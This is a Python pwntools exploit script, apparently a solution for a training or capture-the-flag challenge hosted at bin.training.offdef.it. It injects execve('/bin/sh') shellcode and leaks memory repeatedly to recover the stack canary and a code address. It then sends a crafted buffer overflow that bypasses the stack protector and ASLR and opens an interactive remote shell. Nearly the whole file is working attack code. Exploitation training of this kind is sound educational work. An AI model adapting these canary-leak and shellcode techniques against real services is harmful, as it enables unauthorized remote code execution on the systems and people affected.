#! /usr/bin/python3
import pwn
import time
import copy
def debugbytes(todebug):
    for i in todebug:
        print(hex(i), end=" ")
    print()

def memscan():
    tosend = 104 * b'A'
    length = [104]
    while len(tosend) < 200:
        #input("wait")
        r.send(tosend+b'A')
        r.recvuntil(b'> ')
        out = r.recv()
        debugbytes(out)
        #input("wait")
        tosend = out
        length.append(len(tosend))
        if length[-1] == length[-2]:
            break
    #print(length)
    out = bytearray(out)
    for i in length:
        if i < len(out):
            #print("i: "+str(i), end = " ")
            #print(out[i])
            if out[i]  == 65:
                #print("sost")
                out[i] = 0
    return bytes(out)


#pwn.context.log_level = 'DEBUG'

# per runnare il processo in virtual machine e interagirci da fuori:
# ssh =ssh("username","ip")
# r =  ssh.process("./multistage")                    multistage name of the process

pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./aslr")
#pwn.gdb.attach(r, '''
#''' )
binshaddress=0
assembly='''
pop rdi
mov rax,0x3b
mov rdx,0
mov rsi,0
syscall
'''
pwn.context.arch = "amd64"
shellcode_length=len(pwn.asm(assembly))
r = pwn.remote("bin.training.offdef.it",2012)
r.recv()
input("wait")
r.send(pwn.asm(assembly)+b'/////////////bin/sh\x00')
#input("wait")
scan = memscan()
#input("wait")

canary = scan[105:112]

main_address = scan[136:144]

decimal_main_address = pwn.packing.u64(main_address, sign="unsigned", endian="little")
decimal_main_address += 0x200720
ps1_address = pwn.packing.p64(decimal_main_address, sign="unsigned", endian="little")
decimal_main_address +=shellcode_length
decimal_main_address +=3
binshaddress=pwn.packing.p64(decimal_main_address, sign="unsigned", endian="little")

print("ps1_address:")
debugbytes(ps1_address)
print("canary:")
debugbytes(canary)
print("main_address:")
debugbytes(main_address)
#exploit crafting
r.send(scan[0:104]+b'\x00'+canary+b'\x01\x00\x00\x00\x00\x00\x00\x01'+ps1_address+binshaddress)
input("wait")
r.send(b'\x00')


for i in range(1, len(scan)):
    print(hex(scan[i]), end=" ")
    if i % 8 == 7:
        print()
print()
r.interactive()
